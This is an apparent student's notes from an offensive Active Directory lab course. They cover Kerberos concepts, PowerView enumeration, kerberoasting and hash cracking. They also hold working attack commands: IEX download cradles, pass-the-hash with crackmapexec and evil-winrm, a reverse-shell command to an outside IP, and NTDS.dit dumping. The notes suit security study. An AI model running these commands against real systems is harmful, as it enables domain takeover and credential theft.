# AD Day 1-?
3/28,3/29

#ad #ad/kerberos #kerberos #ntlm
- Very few rabbit holes in AD.
- More straightforward misconfigurations than it is vulnerabilities.
	- Making sure you are doing your OODA check-in's with yourself in an AD environment

# 3/28

## Domains
- The domain is not the security boundary. The FOREST is the boundary. 
- Members of a domain can query resources of another domain.
- Imagine acquiring a new company, and you create a "trust" relationship with their forest to start letting data flow. 
- Domain = collection of resources
- Forest = collection of domains

## LSA or "Local System Authority"
- SAM file (hive) that contains creds only contains local user creds (not domain user creds). 
	- Domain creds are stored in LSASS or HKLM/Security
	- `regsave` to dump the security hive and find domain creds
- Used to be plaintext/NT Hash creds 
- Now we are seeing domain cached credentials (DCC's)
	- Useless for attackers, "creds made from creds"
- Kerberos tickets, however, yield better results. 

## Kerberos
- We only want our password hash to live on the DC, so we use various challenges around encrypting strings with password hashes in various iterations to prove identity. 
- A file share, for example, will send over your password-hash encrypted string over to the DC for decryption and proof of identity. 
	- Responder capitalizes on this, called "replay attacks."

![Kerberos Authentication](../Pasted%20image%2020220328191947.png)

![Kerberos TGT and TGS](Kerberos%20-%20TGT%20and%20TGS.png)

Non-AD Joined users or older Windows versions tend to use NTLM

See [Kerberos](../Knowledge-Base/Windows%20Fundamentals/Active%20Directory/01%20Introduction%20to%20Active%20Directory.md#Kerberos) in [01 Introduction to Active Directory](../Knowledge-Base/Windows%20Fundamentals/Active%20Directory/01%20Introduction%20to%20Active%20Directory.md) for Kerberos breakdown. 

 **A TGT is always encrypted with a users hash**

A TGS is required to interact with a service, requiring a TGT. The DC just checks if the TGT was encrypted with the with the Kerberos TGT users hash and if it does then the auth is successful and it grants the request (TGS). 

A TGT is encrypted with the users hash. A TGS is encrypted with the service accounts hash. 

Putting your hacker hat on, knowing we can forge tickets, we only need the hash of either a Kerberos TGT user or a service account. 
- Kerbergos TGT User Hash = Golden Ticket
- Service Account Hash = Silver Ticket

> Note, the **TGT Kerberos User** is the hash that is used to encrypt tickets. This is the hash we need to encrypt as the golden ticket. 

Good idea to dump Kerberos tickets when you have local admin. 

If you get the hashes and you try to crack them offline, this is #kerberoasting. Because any user can request a TGT/TGS, you can easily extract it for cracking. Authentication is separate from Authorization. Only authentication is required for a TGT/TGS. For this reason NEVER let a service account have admin privileges, because anyone can get a ticket for any service. 

Kerberoasting = obtaining the TGS so you can extract the service account hash for offline cracking

If you used "pack validation" a lot of these problems would be solved. 

`as_rep` roasting is you not having to provide the timestamp os a user. Just sending over a request asking for the TGT for tha tuser. Cannot be used in a typical fashion but you can use it to crack offline. Requires that an account be set up so that is "not require preauthentication."


> From here, jumped into the PEN-200 Windows box for the AD environment. 

## AD Environment
 Start the Windows box. 

```Bash
xfreerdp /u:offsec /p:lab /d:corp /v:192.168.221.10
```

Where am I? Am I domain joined?

```Bash
C:\Windows\system32>whoami
corp\offsec

C:\Windows\system32>hostname
client251

C:\Windows\system32>echo %logonserver%
\\DC01
```

We are domain joined with `corp\`, on a different box or we would be on `client251`, and we were joined by a DC.


```Bash
net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
corp\Domain Admins
corp\offsec
offsec
The command completed successfully.
```

We are local admin. Open an admin prompt. We are looking for domain users. Compare the two commands. 

```Bash
C:\Windows\system32>net user

User accounts for \\CLIENT251

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount
Guest                    offsec                   student
WDAGUtilityAccount
The command completed successfully.


C:\Windows\system32>net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
adam                     Administrator            DefaultAccount
Guest                    iis_service              jeff_admin
krbtgt                   offsec                   sql_service
The command completed successfully.
```

See we have new users with `/domain` added. Note the `krbtgt` user. 

We can also enumerate groups. Good for privileges and fileshares. Can also do "OU", but OU's tend to have groups inside them as well. 

```Bash
C:\Windows\system32>net group /domain
The request will be processed at a domain controller for domain corp.com.


Group Accounts for \\DC01.corp.com

-------------------------------------------------------------------------------
*Another_Nested_Group
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins # Makes sense. High priv
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Nested_Group
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Secret_Group
The command completed successfully.
```

DA is the highest priv. Two domains inside a single forest can escalate to enterprise admins. Enterprise admins is highest in the forest. Generally DA's are EA's. 

Machine account is the highest privilege on a box. May not be a DA or EA but you can dump anything you want. 

Let's find the domain admins group, the "RID 500" users. 

```Bash
C:\Windows\system32>net group "Domain Admins" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            jeff_admin               sql_service
The command completed successfully.
```

The local admin was upgraded to the DA group, and the other two were added. 

Let's look at the `sql_service` user. 

```Bash
C:\Windows\system32>net user sql_service /domain
The request will be processed at a domain controller for domain corp.com.

User name                    sql_service
Full Name                    sql_service
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/15/2019 9:47:46 AM
Password expires             Never
Password changeable          8/16/2019 9:47:46 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

There is a lot of good info here. Note the logon script. This is empty, but could be filled. This is a #privesc/windows #privesc  vector. 


More enumeration. Tells me what domain controlls exist in "corp"

```Bash
C:\Windows\system32>nltest /dclist:corp
Get list of DCs in domain 'corp' from '\\DC01'.
    DC01.corp.com [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully
```

Funny non-CMD. Head to File Explorer > Network > Network Tab > Search Active Directory then search users and search a blank "Find Now"

Can choose "View" and "Choose columns" to find additional information. **This is viewable by all authenticated domain users.** People store really dumb stuff they should not store in here. 

Let's move to PowerShell. 

### PowerShell

Great C2. Can create sessions, give them variable names, and run sessions against those variables (as in, against those sessions). 

Remember **there is almost always a way to run PowerShell.** Just keep looking. Remember that it will likely get at least logged at a minimum level to create a chain of events. 

> Look into AD Module. https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps. Or, Qasim's version https://github.com/hashtaginfosec/ADModule

Head to C > Tools > active_directory for local AD compromise tools. We are using PowerView. Import it from powershell

```Bash
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1

# Cannot import because we need the bypass for restriction policy. 

PS C:\Tools\active_directory> powershell -ep bypass

# Starts a new PowerShell environment with bypass set

PS C:\Tools\active_directory> Import-Module .\PowerView.ps1

# Now we have the PowerView imported
```

As above, we can see we got blocked by the policy. The first thing in any session or custom malware should be the `-ep bypass` portion with the version specified, and we want version 2 because it will almost always exist and it is compatible with 99% of everything **while degrading security.** #evasion #privesc

1. PowerShell verison
2. ep bypass


Now that we have powerview....

```Bash
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
PS C:\Tools\active_directory> Get-DomainUser


logoncount             : 42
iscriticalsystemobject : True
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/28/2022 5:50:03 PM
name                   : Administrator
objectsid              : S-1-5-21-4038953314-3014849035-1274281563-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
....
```

Note things about users. Never logged in? Don't touch it, someone's looking or it doesn't matter.  Let's get granular. Remember that PowerShell is object oriented? Each account has columns. 

```Bash
PS C:\Tools\active_directory> Get-DomainUser | select samaccountname, badpwdcount,serviceprincipalname

samaccountname badpwdcount serviceprincipalname
-------------- ----------- --------------------
Administrator            0
Guest                    0
DefaultAccount           0
krbtgt                   0 kadmin/changepw
offsec                   0
jeff_admin               0
adam                     0
iis_service              0 HTTP/CorpWebServer.corp.com
sql_service              0 MSSQLSvc/CorpSqlServer.corp.com:1433

PS C:\Tools\active_directory> Get-DomainUser | select samaccountname, badpwdcount,serviceprincipalname | Out-File servic
eprincipals.txt
```

Now we saved the data. Let's create some user spray lists

```Bash
PS C:\Tools\active_directory> Get-DomainUser | select samaccountname | Out-File users.txt
PS C:\Tools\active_directory> cat .\users.txt

samaccountname
--------------
Administrator
Guest
DefaultAccount
krbtgt
offsec
jeff_admin
adam
iis_service
sql_service
```

We can also use `Get-DomainGroup` and `Get-DomainGroupMemeber -Identity "Domain Admins"`

```Bash
PS C:\Tools\active_directory> Get-DomainGroupMember -Identity "Domain Admins"


GroupDomain             : corp.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=corp,DC=com
MemberDomain            : corp.com
MemberName              : sql_service
MemberDistinguishedName : CN=sql_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-4038953314-3014849035-1274281563-1107

GroupDomain             : corp.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=corp,DC=com
MemberDomain            : corp.com
MemberName              : jeff_admin
MemberDistinguishedName : CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-4038953314-3014849035-1274281563-1104

GroupDomain             : corp.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=corp,DC=com
MemberDomain            : corp.com
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=corp,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-4038953314-3014849035-1274281563-500
```

From earlier, we saw some "Nested Groups" with the `Get-DomainGroup` command. Let's investigate...

```Bash
PS C:\Tools\active_directory> Get-DomainGroupMember -Identity "Nested_Group" -Recurse


GroupDomain             : corp.com
GroupName               : Nested_Group
GroupDistinguishedName  : CN=Nested_Group,OU=CorpGroups,DC=corp,DC=com
MemberDomain            : corp.com
MemberName              : Another_Nested_Group
MemberDistinguishedName : CN=Another_Nested_Group,OU=CorpGroups,DC=corp,DC=com
MemberObjectClass       : group
MemberSID               : S-1-5-21-4038953314-3014849035-1274281563-1110

GroupDomain             : corp.com
GroupName               : Another_Nested_Group
GroupDistinguishedName  : CN=Another_Nested_Group,OU=CorpGroups,DC=corp,DC=com
MemberDomain            : corp.com
MemberName              : adam
MemberDistinguishedName : CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-4038953314-3014849035-1274281563-1105
```

You can see we found "Another Nested Group" that itself contained "Adam"

# 3/29

Reviewed some of the enum, and the execution poliy bypass when importing the module. 


## Methodology
- We love powerview for domain information
	- `Get-Domain` for information on what domain you are in. 

```Bash
PS C:\Tools\active_directory> import-module .\PowerView.ps1
PS C:\Tools\active_directory> Get-Domain


Forest                  : corp.com
DomainControllers       : {DC01.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC01.corp.com
RidRoleOwner            : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name                    : corp.com
```

Use this object to get "SAM" accounts

```Bash
PS C:\Tools\active_directory> (Get-DomainUser).samaccountname
Administrator
Guest
DefaultAccount
krbtgt
offsec
jeff_admin
adam
iis_service
sql_service
```

We can also select just the name

```Bash
PS C:\Tools\active_directory> Get-DomainUser | Select name

name
----
Administrator
Guest
DefaultAccount
krbtgt
Offsec
Jeff_Admin
Adam
iis_service
sql_service
```

Find out about the DC

```Bash
PS C:\Tools\active_directory> Get-DomainController


Forest                     : corp.com
CurrentTime                : 3/30/2022 12:27:23 AM
HighestCommittedUsn        : 143431
OSVersion                  : Windows Server 2016 Standard
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : corp.com
IPAddress                  : 172.16.221.5
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {}
OutboundConnections        : {}
Name                       : DC01.corp.com
Partitions                 : {DC=corp,DC=com, CN=Configuration,DC=corp,DC=com,
                             CN=Schema,CN=Configuration,DC=corp,DC=com, DC=ForestDnsZones,DC=corp,DC=com...}
```

We can expand the partitions property when we see the elipses (...) telling us there is more info. 


```
PS C:\Tools\active_directory> Get-DomainController | select -ExpandProperty Partitions
DC=corp,DC=com
CN=Configuration,DC=corp,DC=com
CN=Schema,CN=Configuration,DC=corp,DC=com
DC=ForestDnsZones,DC=corp,DC=com
DC=DomainDnsZones,DC=corp,DC=com
```

Take a look at the computer specifically. 

```Bash
PS C:\Tools\active_directory> Get-DomainComputer


pwdlastset                    : 3/16/2022 11:30:06 PM
logoncount                    : 308
msds-generationid             : {135, 130, 151, 77...}
serverreferencebl             : CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
distinguishedname             : CN=DC01,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/29/2022 5:19:06 PM
name                          : DC01
objectsid                     : S-1-5-21-4038953314-3014849035-1274281563-1000
samaccountname                : DC01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : DC01
whenchanged                   : 3/30/2022 12:19:06 AM
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
objectguid                    : 5c07c00e-dfef-4308-916f-38b081d1c5e1
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {8/15/2019 4:44:04 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.corp.com, ldap/DC01.corp.com/DomainDnsZones.corp.com,
                                TERMSRV/DC01, TERMSRV/DC01.corp.com...}
...
```

Take a look at the powerview documentation. https://powersploit.readthedocs.io/en/latest/Recon/ #powerview

```Bash
Get-DomainGroupMember "Domain Admins" -Recurse

[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

```
stopped paying attention here.....about 7:30

### Kerberoasting

- Dealing with a TGT and a TGS
- We can list all the cached tickets on a host with `klist`. 
```Bash
PS C:\Tools\active_directory> klist

Current LogonId is 0:0x9fcf6

Cached Tickets: (5)

#0>     Client: offsec @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/29/2022 17:27:23 (local)
        End Time:   3/30/2022 3:20:11 (local)
        Renew Time: 4/5/2022 17:20:11 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.corp.com

#1>     Client: offsec @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/29/2022 17:20:11 (local)
        End Time:   3/30/2022 3:20:11 (local)
        Renew Time: 4/5/2022 17:20:11 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.corp.com

#2>     Client: offsec @ CORP.COM
        Server: cifs/DC01.corp.com @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/29/2022 17:27:23 (local)
        End Time:   3/30/2022 3:20:11 (local)
        Renew Time: 4/5/2022 17:20:11 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.corp.com
...
```

You want the ticket with the **Server** line matching "krbtgt" for kerberoasting. #0 and #1 are TGTs, #2 is a TGS. The hash of `krbtgt` was used to encrypt 1 and 2. 

You can force a downgraded encryption on a ticket, blue tamers should alert on this as **it is the only plausible way to know if someone is kerberoasting on your domain.** Qasim tells his tools not to downgrade because it is the only way to get caught. Dumping `lsass` is how you get these tickets. 

Want new tickets? Do `klist purge` and access things. None of this was malicious until you start dumping `lsass` and likely won't be detected until investigating the EDR after the fact. 


So how do we go about getting service principle names we might want to try and crack for?

```Bash
PS C:\Tools\active_directory> Get-DomainUser | Select name, serviceprincipalname

name           serviceprincipalname
----           --------------------
Administrator
Guest
DefaultAccount
krbtgt         kadmin/changepw
Offsec
Jeff_Admin
Adam
iis_service    HTTP/CorpWebServer.corp.com
sql_service    MSSQLSvc/CorpSqlServer.corp.com:1433
```

Two of these have service principle names we can use. `iis_service` and `sql_service`. The easiest way to do this (when in PowerView) is the `Invoke-Kerberoast` module. 

```Bash
PS C:\Tools\active_directory> Invoke-Kerberoast -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CORP.COM/DC=CORP,DC=COM
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(servicePrincipalName=*))


SamAccountName       : iis_service
DistinguishedName    : CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com
ServicePrincipalName : HTTP/CorpWebServer.corp.com
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*iis_service$corp.com$HTTP/CorpWebServer.corp.com*$9DBA6FAC23FB2142C5F5121B48A592F9$7CEF3473BB607AD1C0AE131...

The rest of this is a hash then another ticket
```

And that is it. We have a hash. 
- Type of the hash
- SamAccountName
- Actual Hash
	- $ all the way through the end. 


Without paying close attention, they extracted the two hashes and cracked using John and Hashcat

```Bash
(Invoke-Kerberoast).Hash | Out-File kerberoast.txt
```

Pass is `Qwerty09!`
Using Hashcat

```Bash
.\hashcat.exe -m 13100 .\hashes.tgs ..\Wordlists\yhbp2 -w 3 -O -o hashes.tgs.out --self-test-disable
```

Cracking Tips
- Start with a small list on the first cracking job. Just looking for some footholds
- Start longer jobs in the background using rulesets, longer lists, etc. 
- Finish with the "one rule to rule them all" rule from Hashcat
- https://github.com/NotSoSecure/password_cracking_rules 


Loves the tool "pipal" to do some password analysis. 

## AD Day 3

Obfuscating powershell with https://github.com/CBHue/PyFuscation

We can host PowerView on a webserver from our host and use that to run commands from memory on PowerShell with an "IEX cradle"

```Bash
PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.122:8080/PowerView.ps1'); Get-DomainUser


logoncount             : 42
iscriticalsystemobject : True
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/30/2022 5:09:27 PM
name                   : Administrator
objectsid              : S-1-5-21-4038953314-3014849035-1274281563-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
```

The idea is that we do everything with a single command, running in memory, never touching disks. IEX Cradles are powerful, above example may get detected

Even better, run it all in a powershell process that executes on completion. 

```Bash
PS C:\Windows\system32> powershell -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.122:8080/PowerView.ps1'); Get-DomainUser"
```

Even just the command `IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.122:8080/PowerView.ps1')` will bring it in memory. 

Once it is imported we can start using PowerView for `Invoke-Kerberoast`. 

`(Invoke-Kerberoast -OutputFormat).Hash` <- This command missing something

Once we get the cracked password, we can do a `runas.exe /user:CORP\sql_service powershell` with the password and we have an elevated shell. 

Once on the new powershell window (password Qwerty09!) as user `corp\sql_service`, we import PowerView again and start enumerating

```Bash
Get-DomainComputer | select name
```

We want to see if we are local admin on the domain server, so we use PowerSHell remoting for a "PSSession" on the "DC01" host. 

```Bash
Enter-PSSession -ComputerName DC01

whoami /privs

net user
```

We can also just run commands against a different box, not requiring us to log in to the target. 

```Bash
PS C:\Windows\system32> Invoke-Command -ComputerName DC01 -Credential CORP\SQL_Service -ScriptBlock {whoami ; hostname}
corp\sql_service
DC01
PS C:\Windows\system32>
```

We can ever store it as a variable and runs commands against it.

```Bash
$session1 = New-PSSession -ComputerName DC01 -Credential CORP\SQL_Service
Invoke-Command -Session $session1 -ScriptBlock {hostname}
```

Or another

```
$session1 = New-PSSession -ComputerName DC01 -Credential CORP\sql_servi
ce

Invoke-Command -Session $session1 -FilePath .\PowerView.ps1

Invoke-Command -Session $session1 -ScriptBlock {Get-DomainUser}
```

**All of these commands above for PSSession are running powershell over SMB for PSSession**

Started playing games, they started working on pass the hash #passthehash #lateralmovement

```Bash
crackmapexec smb 192.168.146.10 -u offsec -p lab --lsa

```

```Bash
crackmapexec smb 192.168.146.10 -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e --local-auth
```
#crackmapexec 

More lapsing..


```Bash
evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e -i 192.168.146.10
```

#evilwinrm
https://github.com/Hackplayers/evil-winrm

Pass the has with #crackmapexec 

```Bash
crackmapexec smb 192.168.146.10 -u admin -H 2892d26cdf84d7a70e2eb3b9f05c425e --local-auth -X "IEX (New-Object Net.Webclient).DownloadString('http://xxxxxx/Invoke_PowershellTCP.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444"
```

NTDS util to dump hashes. Grabs a copy of NTDS while windows is using it (because you cannot usually) by making a shadow copy of the C drive in memory and grabbing the relevant files.
#ntdsutil

```Bash
ntdsutil.exe "Activate instance ntds" "ifm" "create full C:\TEMP\ntds.copy"
```

```Bash
Copy-Item -FromSession $session1 "C:\TEMP\ntds.copy\Active Directo
ry\ntds.dit" -Destination .
```

## Day 5
#ad/kerberoasting #ad/spn_roasting

- Goal is to get DA, create a user and kerberoast the user. 

- Logged in as `sql_service:Qwerty09!`. 







## Hutch Day
Note from someone on uploading files
```Bash
curl -T '[file path to upload]' 'http://192.168.152.122/' -u fmcsorley:CrabSharkJellyfish192
```